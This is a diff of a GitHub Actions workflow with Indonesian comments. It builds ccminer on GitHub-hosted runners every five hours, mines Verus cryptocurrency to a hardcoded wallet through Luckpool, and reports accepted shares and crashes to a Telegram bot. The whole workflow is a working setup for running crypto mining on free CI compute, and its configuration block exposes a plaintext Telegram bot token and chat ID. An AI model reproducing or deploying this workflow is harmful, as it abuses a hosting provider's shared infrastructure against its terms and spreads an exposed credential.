@@ -2,90 +2,89 @@ name: A4
 
 on:
   schedule:
-    - cron: "0 */5 * * *"        # Jalan tiap 5 jam
+    - cron: "0 */5 * * *"  # Jalan tiap 5 jam
   workflow_dispatch:
 
 jobs:
   verusmine:
     runs-on: ubuntu-latest
-    timeout-minutes: 300         # Stop otomatis setelah 5 jam
+    timeout-minutes: 300  # Stop otomatis setelah 5 jam
 
     steps:
-    - name: Install dependencies
-      run: |
-        sudo apt update
-        sudo apt install -y \
-          build-essential git cmake automake libtool autoconf pkg-config \
-          libcurl4-openssl-dev screen
+      - name: Install dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y \
+            build-essential git cmake automake libtool autoconf pkg-config \
+            libcurl4-openssl-dev
 
-    - name: Clone & build ccminer
-      run: |
-        git clone https://github.com/monkins1010/ccminer.git
-        cd ccminer
-        chmod +x build.sh
-        ./build.sh || { echo "❌ Build gagal"; exit 1; }
+      - name: Clone & build ccminer (HYBRID Version)
+        run: |
+          git clone https://github.com/monkins1010/ccminer.git
+          cd ccminer
+          chmod +x build.sh
+          ./build.sh
 
-    - name: Start mining (Luckpool Hybrid Mode)
-      run: |
-        cd ccminer
+      - name: Start Hybrid Mining with Telegram Monitor
+        run: |
+          cd ccminer
 
-        # ————— KONFIGURASI —————
-        WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
-        POOL="stratum+tcp://ap.luckpool.net:3956#xnsub"
-        PASSWORD="hybrid"
-        THREADS=2
-        WORKER="A4"
-        LOG_FILE="log.txt"
-        MAX_IDLE=600
+          # Konfigurasi mining
+          WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
+          WORKER="A4"
+          TELEGRAM_TOKEN="7548058927:AAF-fL3P6W5sNxbzbmwwtsfVxPZubdIybzc"
+          TELEGRAM_CHAT_ID="5763229296"
+          LOG_FILE="log.txt"
+          MAX_IDLE=600  # 10 menit
 
-        TELEGRAM_TOKEN="7548058927:AAF-fL3P6W5sNxbzbmwwtsfVxPZubdIybzc"
-        TELEGRAM_CHAT_ID="5763229296"
+          # Fungsi notifikasi Telegram
+          tg_notify() {
+            curl -s -X POST https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage \
+              -d chat_id=$TELEGRAM_CHAT_ID \
+              -d parse_mode=Markdown \
+              -d text="$1"
+          }
 
-        # ————— FUNGSI TELEGRAM —————
-        send_telegram() {
-          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
-            -d chat_id=${TELEGRAM_CHAT_ID} \
-            -d parse_mode=Markdown \
-            -d text="$1"
-        }
+          tg_notify "🚀 *A4 HYBRID mining started* with 2 threads."
 
-        send_telegram "⛏️ *Mining dimulai* sebagai *$WORKER* (mode *hybrid*) dengan *$THREADS* thread."
+          # Menjalankan mining hybrid mode (Luckpool)
+          ./ccminer -a verus \
+            -o stratum+tcp://na.luckpool.net:3956 \
+            -u $WALLET.$WORKER -p hybrid -t 2 > $LOG_FILE 2>&1 &
 
-        # ————— JALANKAN MINER —————
-        rm -f "$LOG_FILE"
-        ./ccminer -a verus \
-        -o $POOL \
-        -u $WALLET.$WORKER \
-        -p $PASSWORD \
-        -t $THREADS | tee "$LOG_FILE" &
+          PID=$!
+          LAST_ACCEPTED=$(date +%s)
+          SHARES_ACCEPTED=0
 
-        MINER_PID=$!
-        LAST_ACCEPTED=$(date +%s)
+          # Monitoring CPU (opsional)
+          ( while true; do
+              CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}')
+              echo "[CPU] Usage: $CPU%"
+              sleep 60
+            done ) &
 
-        # ————— Pantau share accepted —————
-        tail -F "$LOG_FILE" | while read LINE; do
-          if echo "$LINE" | grep -q "accepted"; then
-            LAST_ACCEPTED=$(date +%s)
-            TOTAL=$(grep -c "accepted" "$LOG_FILE")
-            send_telegram "🎉 *Share accepted* ke‑$TOTAL di *$WORKER*"
-          fi
-        done & TAIL_PID=$!
+          # Monitoring log dan share
+          tail -F $LOG_FILE | while read -r line; do
+            echo "$line"
+            NOW=$(date +%s)
 
-        # ————— Watchdog crash & idle —————
-        while sleep 60; do
-          if ! kill -0 $MINER_PID 2>/dev/null; then
-            send_telegram "❌ *Miner crash* di *$WORKER*."
-            break
-          fi
-          NOW=$(date +%s)
-          if [ $((NOW - LAST_ACCEPTED)) -gt $MAX_IDLE ]; then
-            send_telegram "⚠️ *Tidak ada share diterima* selama 10 menit. Restarting miner di *$WORKER*…"
-            kill $MINER_PID
-            break
-          fi
-        done
+            if echo "$line" | grep -q "accepted"; then
+              SHARES_ACCEPTED=$((SHARES_ACCEPTED + 1))
+              LAST_ACCEPTED=$NOW
+              HASHRATE=$(echo "$line" | grep -o "[0-9.]\+ kH/s")
+              tg_notify "✅ *A4 accepted share*\n📈 $HASHRATE\n💠 Total: *$SHARES_ACCEPTED*"
+            fi
 
-        # ————— Bersih‑bersih & ringkasan —————
-        kill $TAIL_PID 2>/dev/null || true
-        SHARES=$(grep -c "accepted" "$LOG_FILE")
-        send_telegram "✅ *Mining selesai* di *$WORKER*. Total accepted: *$SHARES*"
+            if [ $((NOW - LAST_ACCEPTED)) -gt $MAX_IDLE ]; then
+              tg_notify "⚠️ *hera idle* >10 menit. Restarting..."
+              kill $PID
+              break
+            fi
+
+            if ! ps -p $PID > /dev/null; then
+              tg_notify "❌ *hera miner crashed*"
+              break
+            fi
+          done
+
+          tg_notify "✅ *hera mining ended*\nTotal shares: *$SHARES_ACCEPTED*"
